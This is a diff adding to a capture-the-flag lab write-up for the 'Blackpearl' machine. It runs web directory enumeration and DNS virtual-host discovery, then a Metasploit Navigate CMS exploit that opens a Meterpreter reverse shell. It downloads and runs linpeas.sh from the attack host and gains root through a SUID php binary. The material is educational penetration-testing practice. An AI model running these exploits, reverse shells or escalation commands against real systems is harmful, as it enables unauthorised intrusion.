@@ -148,7 +148,7 @@ DOWNLOADED: 81628 - FOUND: 1
 
 
 
-The URL `http://10.0.2.25/secret` is a text file with the following content:
+The URL `http://10.0.2.15/secret` is a text file with the following content:
 
 ```
     OMG you got r00t !
@@ -165,14 +165,24 @@ Maybe we assume this is credible and stop enumerating port 80, except perhaps
 for the **username `alek`** and the **email address `alek@blackpearl.tcm`**.
 
 
+The same search can also be carried out using `ffuf` as follows:
+
+```
+┌──(kali㉿kali)-[~/Capstone/Blackpearl]
+└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://10.0.2.15/FUZZ`
+```
+
+The result is no different though.
+
+
 
 ## Port 22 (SSH)
 
-sad
+We ignore SSH just as we did on the previous machines.
 
 
 
-## Port 53 (ISC BIND)
+## Port 53 (DNS / ISC BIND)
 
 There seems to be a vulnerability in this version of BIND, a buffer overflow as
 described in
@@ -312,8 +322,463 @@ addresses](https://en.wikipedia.org/wiki/Reserved_IP_addresses):
 CIDR: 127.0.0.0/8, address range: 127.0.0.0–127.255.255.255, 16777216 addresses, used for loopback addresses to the local host
 ```
 
+```
+┌──(kali㉿kali)-[~/Capstone/Blackpearl]
+└─$ dnsrecon -r 127.0.0.0/24 -n 10.0.2.15                                           
+[*] Performing Reverse Lookup from 127.0.0.0 to 127.0.0.255
+[+]      PTR blackpearl.tcm 127.0.0.1
+[+] 1 Records Found
+
+┌──(kali㉿kali)-[~/Capstone/Blackpearl]
+└─$ sudo vim /etc/hosts
+
+127.0.0.1       localhost
+127.0.1.1       kali
+::1             localhost ip6-localhost ip6-loopback
+ff02::1         ip6-allnodes
+ff02::2         ip6-allrouters
+10.0.2.15       blackpearl.tcm
+```
 
 
+
+<img src="./images/Blackpearl__HiddenWebpage.png" alt="Hidden website http://blackpearl.tcm" width="800"/>
+
+
+
+```
+┌──(kali㉿kali)-[~/Capstone/Blackpearl]
+└─$ dirb http://blackpearl.tcm/ /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt 
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Sat Jul 19 11:27:43 2025
+URL_BASE: http://blackpearl.tcm/
+WORDLIST_FILES: /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt
+
+-----------------
+
+GENERATED WORDS: 81628                                                         
+
+---- Scanning URL: http://blackpearl.tcm/ ----
+==> DIRECTORY: http://blackpearl.tcm/navigate/                                                                                                                                                                                             
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/ ----
+==> DIRECTORY: http://blackpearl.tcm/navigate/img/                                                                                                                                                                                         
+==> DIRECTORY: http://blackpearl.tcm/navigate/themes/                                                                                                                                                                                      
+==> DIRECTORY: http://blackpearl.tcm/navigate/web/                                                                                                                                                                                         
+==> DIRECTORY: http://blackpearl.tcm/navigate/plugins/                                                                                                                                                                                     
+==> DIRECTORY: http://blackpearl.tcm/navigate/css/                                                                                                                                                                                         
+==> DIRECTORY: http://blackpearl.tcm/navigate/updates/                                                                                                                                                                                     
+==> DIRECTORY: http://blackpearl.tcm/navigate/lib/                                                                                                                                                                                         
+==> DIRECTORY: http://blackpearl.tcm/navigate/js/                                                                                                                                                                                          
+==> DIRECTORY: http://blackpearl.tcm/navigate/private/                                                                                                                                                                                     
+==> DIRECTORY: http://blackpearl.tcm/navigate/cache/                                                                                                                                                                                       
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/img/ ----
+==> DIRECTORY: http://blackpearl.tcm/navigate/img/icons/                                                                                                                                                                                   
+==> DIRECTORY: http://blackpearl.tcm/navigate/img/logos/                                                                                                                                                                                   
+==> DIRECTORY: http://blackpearl.tcm/navigate/img/skins/                                                                                                                                                                                   
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/themes/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/web/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/plugins/ ----
+==> DIRECTORY: http://blackpearl.tcm/navigate/plugins/votes/                                                                                                                                                                               
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/css/ ----
+==> DIRECTORY: http://blackpearl.tcm/navigate/css/tools/                                                                                                                                                                                   
+==> DIRECTORY: http://blackpearl.tcm/navigate/css/skins/                                                                                                                                                                                   
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/updates/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/lib/ ----
+==> DIRECTORY: http://blackpearl.tcm/navigate/lib/layout/                                                                                                                                                                                  
+==> DIRECTORY: http://blackpearl.tcm/navigate/lib/core/                                                                                                                                                                                    
+==> DIRECTORY: http://blackpearl.tcm/navigate/lib/packages/                                                                                                                                                                                
+==> DIRECTORY: http://blackpearl.tcm/navigate/lib/external/                                                                                                                                                                                
+==> DIRECTORY: http://blackpearl.tcm/navigate/lib/permissions/                                                                                                                                                                             
+==> DIRECTORY: http://blackpearl.tcm/navigate/lib/i18n/                                                                                                                                                                                    
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/js/ ----
+==> DIRECTORY: http://blackpearl.tcm/navigate/js/tools/                                                                                                                                                                                    
+==> DIRECTORY: http://blackpearl.tcm/navigate/js/plugins/                                                                                                                                                                                  
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/private/ ----
+==> DIRECTORY: http://blackpearl.tcm/navigate/private/1/                                                                                                                                                                                   
+==> DIRECTORY: http://blackpearl.tcm/navigate/private/cache/                                                                                                                                                                               
+==> DIRECTORY: http://blackpearl.tcm/navigate/private/sessions/                                                                                                                                                                            
+==> DIRECTORY: http://blackpearl.tcm/navigate/private/tmp/                                                                                                                                                                                 
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/cache/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/img/icons/ ----
+==> DIRECTORY: http://blackpearl.tcm/navigate/img/icons/misc/                                                                                                                                                                              
+==> DIRECTORY: http://blackpearl.tcm/navigate/img/icons/flags/                                                                                                                                                                             
+==> DIRECTORY: http://blackpearl.tcm/navigate/img/icons/silk/                                                                                                                                                                              
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/img/logos/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/img/skins/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/plugins/votes/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/css/tools/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/css/skins/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/lib/layout/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/lib/core/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/lib/packages/ ----
+==> DIRECTORY: http://blackpearl.tcm/navigate/lib/packages/about/                                                                                                                                                                          
+==> DIRECTORY: http://blackpearl.tcm/navigate/lib/packages/products/                                                                                                                                                                       
+==> DIRECTORY: http://blackpearl.tcm/navigate/lib/packages/templates/                                                                                                                                                                      
+==> DIRECTORY: http://blackpearl.tcm/navigate/lib/packages/files/                                                                                                                                                                          
+==> DIRECTORY: http://blackpearl.tcm/navigate/lib/packages/themes/                                                                                                                                                                         
+==> DIRECTORY: http://blackpearl.tcm/navigate/lib/packages/comments/                                                                                                                                                                       
+==> DIRECTORY: http://blackpearl.tcm/navigate/lib/packages/users/                                                                                                                                                                          
+==> DIRECTORY: http://blackpearl.tcm/navigate/lib/packages/feeds/                                                                                                                                                                          
+==> DIRECTORY: http://blackpearl.tcm/navigate/lib/packages/profiles/                                                                                                                                                                       
+==> DIRECTORY: http://blackpearl.tcm/navigate/lib/packages/update/                                                                                                                                                                         
+==> DIRECTORY: http://blackpearl.tcm/navigate/lib/packages/items/                                                                                                                                                                          
+==> DIRECTORY: http://blackpearl.tcm/navigate/lib/packages/blocks/                                                                                                                                                                         
+==> DIRECTORY: http://blackpearl.tcm/navigate/lib/packages/orders/                                                                                                                                                                         
+==> DIRECTORY: http://blackpearl.tcm/navigate/lib/packages/extensions/                                                                                                                                                                     
+==> DIRECTORY: http://blackpearl.tcm/navigate/lib/packages/settings/                                                                                                                                                                       
+==> DIRECTORY: http://blackpearl.tcm/navigate/lib/packages/websites/                                                                                                                                                                       
+==> DIRECTORY: http://blackpearl.tcm/navigate/lib/packages/coupons/                                                                                                                                                                        
+==> DIRECTORY: http://blackpearl.tcm/navigate/lib/packages/structure/                                                                                                                                                                      
+==> DIRECTORY: http://blackpearl.tcm/navigate/lib/packages/dashboard/                                                                                                                                                                      
+==> DIRECTORY: http://blackpearl.tcm/navigate/lib/packages/utils/                                                                                                                                                                          
+==> DIRECTORY: http://blackpearl.tcm/navigate/lib/packages/menus/                                                                                                                                                                          
+==> DIRECTORY: http://blackpearl.tcm/navigate/lib/packages/brands/                                                                                                                                                                         
+==> DIRECTORY: http://blackpearl.tcm/navigate/lib/packages/permissions/                                                                                                                                                                    
+==> DIRECTORY: http://blackpearl.tcm/navigate/lib/packages/functions/                                                                                                                                                                      
+==> DIRECTORY: http://blackpearl.tcm/navigate/lib/packages/properties/                                                                                                                                                                     
+==> DIRECTORY: http://blackpearl.tcm/navigate/lib/packages/backups/                                                                                                                                                                        
+==> DIRECTORY: http://blackpearl.tcm/navigate/lib/packages/paths/                                                                                                                                                                          
+==> DIRECTORY: http://blackpearl.tcm/navigate/lib/packages/webusers/                                                                                                                                                                       
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/lib/external/ ----
+==> DIRECTORY: http://blackpearl.tcm/navigate/lib/external/misc/                                                                                                                                                                           
+==> DIRECTORY: http://blackpearl.tcm/navigate/lib/external/tracy/                                                                                                                                                                          
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/lib/permissions/ ----
+==> DIRECTORY: http://blackpearl.tcm/navigate/lib/permissions/i18n/                                                                                                                                                                        
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/lib/i18n/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/js/tools/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/js/plugins/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/private/1/ ----
+==> DIRECTORY: http://blackpearl.tcm/navigate/private/1/templates/                                                                                                                                                                         
+==> DIRECTORY: http://blackpearl.tcm/navigate/private/1/files/                                                                                                                                                                             
+==> DIRECTORY: http://blackpearl.tcm/navigate/private/1/thumbnails/                                                                                                                                                                        
+==> DIRECTORY: http://blackpearl.tcm/navigate/private/1/cache/                                                                                                                                                                             
+==> DIRECTORY: http://blackpearl.tcm/navigate/private/1/backups/                                                                                                                                                                           
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/private/cache/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/private/sessions/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/private/tmp/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/img/icons/misc/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/img/icons/flags/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/img/icons/silk/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/lib/packages/about/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/lib/packages/products/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/lib/packages/templates/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/lib/packages/files/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/lib/packages/themes/ ----
+^[                                                                                                                                                                                                                                          ^[                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
+---- Entering directory: http://blackpearl.tcm/navigate/lib/packages/comments/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/lib/packages/users/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/lib/packages/feeds/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/lib/packages/profiles/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/lib/packages/update/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/lib/packages/items/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/lib/packages/blocks/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/lib/packages/orders/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/lib/packages/extensions/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/lib/packages/settings/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/lib/packages/websites/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/lib/packages/coupons/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/lib/packages/structure/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/lib/packages/dashboard/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/lib/packages/utils/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/lib/packages/menus/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/lib/packages/brands/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/lib/packages/permissions/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/lib/packages/functions/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/lib/packages/properties/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/lib/packages/backups/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/lib/packages/paths/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/lib/packages/webusers/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/lib/external/misc/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/lib/external/tracy/ ----
+==> DIRECTORY: http://blackpearl.tcm/navigate/lib/external/tracy/src/                                                                                                                                                                      
+==> DIRECTORY: http://blackpearl.tcm/navigate/lib/external/tracy/examples/                                                                                                                                                                 
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/lib/permissions/i18n/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/private/1/templates/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/private/1/files/ ----
++ http://blackpearl.tcm/navigate/private/1/files/2 (CODE:200|SIZE:104725)                                                                                                                                                                  
++ http://blackpearl.tcm/navigate/private/1/files/3 (CODE:200|SIZE:93426)                                                                                                                                                                   
++ http://blackpearl.tcm/navigate/private/1/files/4 (CODE:200|SIZE:78967)                                                                                                                                                                   
++ http://blackpearl.tcm/navigate/private/1/files/5 (CODE:200|SIZE:183749)                                                                                                                                                                  
++ http://blackpearl.tcm/navigate/private/1/files/6 (CODE:200|SIZE:202653)                                                                                                                                                                  
++ http://blackpearl.tcm/navigate/private/1/files/9 (CODE:200|SIZE:1052)                                                                                                                                                                    
++ http://blackpearl.tcm/navigate/private/1/files/7 (CODE:200|SIZE:372240)                                                                                                                                                                  
++ http://blackpearl.tcm/navigate/private/1/files/8 (CODE:200|SIZE:3166)                                                                                                                                                                    
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/private/1/thumbnails/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/private/1/cache/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/private/1/backups/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/lib/external/tracy/src/ ----
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/lib/external/tracy/examples/ ----
+==> DIRECTORY: http://blackpearl.tcm/navigate/lib/external/tracy/examples/assets/                                                                                                                                                          
+                                                                                                                                                                                                                                           
+---- Entering directory: http://blackpearl.tcm/navigate/lib/external/tracy/examples/assets/ ----
+                                                                               makehomepage                                                                                                                                                
+-----------------
+END_TIME: Sat Jul 19 12:10:50 2025
+DOWNLOADED: 5877216 - FOUND: 8
+```
+
+
+
+<img src="./images/Blackpearl__NavigateLogin.png" alt="Login page for Navigate CMS v2.8 on http://blackpearl.tcm/navigate/" width="800"/>
+
+<img src="./images/Blackpearl__NavigateUnauthorizedRCE.png" alt="Search for Navigate CMS Exploits" width="800"/>
+
+<img src="./images/Blackpearl__NavigateUnauthorizedRCE_Details_1.png" alt="Search for Navigate CMS Exploits" width="800"/>
+
+<img src="./images/Blackpearl__NavigateUnauthorizedRCE_Details_2.png" alt="Search for Navigate CMS Exploits" width="800"/>
+
+
+
+```
+msf6 > use exploit/multi/http/navigate_cms_rce
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+
+msf6 exploit(multi/http/navigate_cms_rce) > options
+
+Module options (exploit/multi/http/navigate_cms_rce):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit
+                                         /basics/using-metasploit.html
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /navigate/       yes       Base Navigate CMS directory path
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.0.2.5         yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/http/navigate_cms_rce) > set rhosts 10.0.2.15
+rhosts => 10.0.2.15
+
+msf6 exploit(multi/http/navigate_cms_rce) > set vhost blackpearl.tcm
+vhost => blackpearl.tcm
+
+msf6 exploit(multi/http/navigate_cms_rce) > show targets
+
+Exploit targets:
+=================
+
+    Id  Name
+    --  ----
+=>  0   Automatic
+
+msf6 exploit(multi/http/navigate_cms_rce) > exploit
+[*] Started reverse TCP handler on 10.0.2.5:4444 
+[+] Login bypass successful
+[+] Upload successful
+[*] Triggering payload...
+[*] Sending stage (40004 bytes) to 10.0.2.15
+[*] Meterpreter session 1 opened (10.0.2.5:4444 -> 10.0.2.15:53786) at 2025-07-19 13:36:58 -0400
+
+meterpreter > shell
+Process 1491 created.
+Channel 1 created.
+
+whoami
+www-data
+```
+
+
+
+<img src="./images/Blackpearl__ttyShell.png" alt="Options for tty shells" width="800"/>
+
+
+
+```
+which python
+/usr/bin/python
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@blackpearl:~/blackpearl.tcm/navigate$ export TERM=xterm
+export TERM=xterm
+```
+
+Now we have an actual TTY shell on the target machine. We can now try to use
+privilege escalation with `LINPEAS` as we did with the `Academy` machine. To
+this end, we start a python web server in the folder where `LINPEAS.sh` is
+stored:
+
+```
+┌──(kali㉿kali)-[~/Capstone/Academy]
+└─$ python -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+On the target machine, we cd into `/tmp` to be able to write in this directory,
+then we download `linpeas.sh` from our attack machine, make it executable and
+run it:
+
+```
+www-data@blackpearl:/tmp$ cd /tmp
+cd /tmp
+www-data@blackpearl:/tmp$ wget http://10.0.2.5/linpeas.sh
+wget http://10.0.2.5/linpeas.sh
+--2025-07-19 18:50:37--  http://10.0.2.5/linpeas.sh
+Connecting to 10.0.2.5:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 954437 (932K) [text/x-sh]
+Saving to: ‘linpeas.sh’
+
+linpeas.sh          100%[===================>] 932.07K  --.-KB/s    in 0.02s
+
+2025-07-19 18:50:37 (38.7 MB/s) - ‘linpeas.sh’ saved [954437/954437]
+
+www-data@blackpearl:/tmp$ ls
+ls
+linpeas.sh
+systemd-private-6196c05928764f57bdc9aa00d1e5bcc2-systemd-timesyncd.service-9oq8F5
+www-data@blackpearl:/tmp$ chmod +x linpeas.sh
+chmod +x linpeas.sh
+www-data@blackpearl:/tmp$ ./linpeas.sh
+./linpeas.sh
+```
+
+
+
+In the `LINPEAS` output we search for red text and particularly red on yellow!
+The way to exploit this machine is to use executables that everyone can execute
+and that have the SUID bit set for the owner `root`.
+
+
+
+<img src="./images/Blackpearl__FilesWithSUIDSet.png" alt="LINPEAS: files with SUID bit set" width="800"/>
+
+
+
+These files are found by `LINPEAS`, but it is also possible to use the `find`
+command to find them: `find / -type f -perm 4000 2>/dev/null`
+
+(Maybe this is the case "in principle", but I do not get any output from this
+command. Perhaps `LINPEAS` uses some tricks to get this information, whereas I
+do not have the necessary access rights if I run the command as the
+low-privilege user `www-data`?!)
+
+Anyway, knowing that `/usr/bin/php7.3` is one of the executables that are owned
+by `root`, have the SUID bit set and are executable by everyone, we can go back
+to the previously used site [GTFOBins](https://gtfobins.github.io/) and search
+for ways to exploit this combination.
+
+
+
+<img src="./images/Blackpearl__PrivilegeEscalationWithPHP.png" alt="Privilege escalation using PHP" width="800"/>
+
+
+
+```
+www-data@blackpearl:/$ /usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
+/usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
+# whoami
+whoami
+root
+# cd /root
+cd /root
+# ls
+ls
+flag.txt
+# cat flag.txt
+cat flag.txt
+Good job on this one.
+Finding the domain name may have been a little guessy,
+but the goal of this box is mainly to teach about Virtual Host Routing which is used in a lot of CTF.
+# 
+```
+
+
+
+**Mission accomplished.**
 
 
 
